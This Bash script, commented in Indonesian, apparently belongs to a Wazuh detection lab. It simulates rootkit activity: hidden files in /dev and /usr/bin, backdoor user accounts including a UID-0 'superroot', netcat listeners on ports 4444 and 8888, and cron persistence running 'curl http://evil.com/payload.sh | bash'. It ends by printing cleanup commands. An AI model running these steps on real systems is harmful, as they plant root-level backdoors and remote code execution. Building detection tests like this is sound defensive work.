#!/bin/bash
# ===================================================
# Simulasi Rootkit & Suspicious Activity Detection
# Jalankan di Agent 3
# ===================================================
# Usage: sudo bash attack-rootkit.sh
# ===================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${RED}=================================================${NC}"
echo -e "${RED}   SIMULASI: ROOTKIT & SUSPICIOUS ACTIVITY        ${NC}"
echo -e "${RED}=================================================${NC}"
echo ""
echo -e "${YELLOW}[WARNING] Ini hanya simulasi untuk tujuan edukasi!${NC}"
echo ""

# Cek root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[ERROR] Jalankan dengan sudo!${NC}"
    exit 1
fi

# ====== Simulasi 1: Hidden files in suspicious locations ======
echo -e "${YELLOW}[1/5] Creating hidden files (rootkit indicator)...${NC}"
touch /dev/.hidden_backdoor
touch /dev/.secret_channel
touch /usr/bin/.covert_tool
mkdir -p /tmp/.hidden_dir
echo "C2 server: evil.com:8080" > /tmp/.hidden_dir/.config
echo -e "${GREEN}  Hidden files created in /dev/ and /usr/bin/${NC}"
echo ""
sleep 3

# ====== Simulasi 2: Suspicious user creation ======
echo -e "${YELLOW}[2/5] Creating suspicious user accounts...${NC}"

# User biasa dengan nama mencurigakan
useradd -M -s /bin/bash backdoor_user 2>/dev/null && echo -e "  ${RED}→${NC} Created user: backdoor_user"
useradd -M -s /bin/bash hacker 2>/dev/null && echo -e "  ${RED}→${NC} Created user: hacker"

# User dengan UID 0 (root equivalent - sangat berbahaya!)
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash superroot 2>/dev/null && echo -e "  ${RED}→${NC} Created user: superroot (UID 0!)"

echo -e "${GREEN}  Suspicious users created${NC}"
echo ""
sleep 3

# ====== Simulasi 3: Suspicious processes ======
echo -e "${YELLOW}[3/5] Launching suspicious processes...${NC}"

# Fake cryptocurrency miner
nohup bash -c 'while true; do echo "mining..." > /dev/null; sleep 60; done' &
MINER_PID=$!
echo -e "  ${RED}→${NC} Fake miner process started (PID: ${MINER_PID})"

# Suspicious background process
nohup bash -c 'while true; do sleep 30; done' &
BG_PID=$!
echo -e "  ${RED}→${NC} Suspicious background process (PID: ${BG_PID})"

echo "$MINER_PID" > /tmp/demo_pids.txt
echo "$BG_PID" >> /tmp/demo_pids.txt

echo -e "${GREEN}  Suspicious processes started${NC}"
echo ""
sleep 3

# ====== Simulasi 4: Network backdoor ======
echo -e "${YELLOW}[4/5] Setting up network backdoor (netcat listener)...${NC}"

# Install netcat if needed
apt install -y netcat-openbsd 2>/dev/null || apt install -y ncat 2>/dev/null

# Start listener on suspicious port
if command -v nc &> /dev/null; then
    nc -l -p 4444 &
    NC_PID=$!
    echo "$NC_PID" >> /tmp/demo_pids.txt
    echo -e "  ${RED}→${NC} Netcat listener on port 4444 (PID: ${NC_PID})"
    
    nc -l -p 8888 &
    NC_PID2=$!
    echo "$NC_PID2" >> /tmp/demo_pids.txt
    echo -e "  ${RED}→${NC} Netcat listener on port 8888 (PID: ${NC_PID2})"
fi

echo -e "${GREEN}  Backdoor listeners started${NC}"
echo ""
sleep 3

# ====== Simulasi 5: Suspicious crontab ======
echo -e "${YELLOW}[5/5] Adding suspicious crontab entries...${NC}"

# Backup existing crontab
crontab -l 2>/dev/null > /tmp/crontab_backup.txt

# Add suspicious cron jobs
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden_dir/.config") | crontab -
(crontab -l 2>/dev/null; echo "0 * * * * curl http://evil.com/payload.sh | bash") | crontab -

echo -e "  ${RED}→${NC} Added persistence cron: run hidden script every 5 min"
echo -e "  ${RED}→${NC} Added C2 cron: download & execute payload every hour"
echo -e "${GREEN}  Suspicious crontab entries added${NC}"
echo ""

echo -e "${RED}=================================================${NC}"
echo -e "${GREEN}SIMULASI ROOTKIT SELESAI!${NC}"
echo ""
echo -e "${YELLOW}Cek Wazuh Dashboard:${NC}"
echo "  1. Security Events → filter: rule.groups: rootcheck"
echo "  2. Cek alerts untuk hidden files"
echo "  3. Cek alerts untuk new user creation"
echo "  4. Cek alerts untuk suspicious network activity"
echo ""
echo -e "${YELLOW}CLEANUP (WAJIB jalankan setelah demo):${NC}"
echo "  # Hapus hidden files"
echo "  sudo rm -f /dev/.hidden_backdoor /dev/.secret_channel /usr/bin/.covert_tool"
echo "  sudo rm -rf /tmp/.hidden_dir"
echo ""
echo "  # Hapus suspicious users"
echo "  sudo userdel backdoor_user 2>/dev/null"
echo "  sudo userdel hacker 2>/dev/null"
echo "  sudo userdel superroot 2>/dev/null"
echo ""
echo "  # Kill suspicious processes"
echo "  kill \$(cat /tmp/demo_pids.txt) 2>/dev/null"
echo "  rm /tmp/demo_pids.txt"
echo ""
echo "  # Restore crontab"
echo "  crontab /tmp/crontab_backup.txt"
echo "  rm /tmp/crontab_backup.txt"
echo -e "${RED}=================================================${NC}"
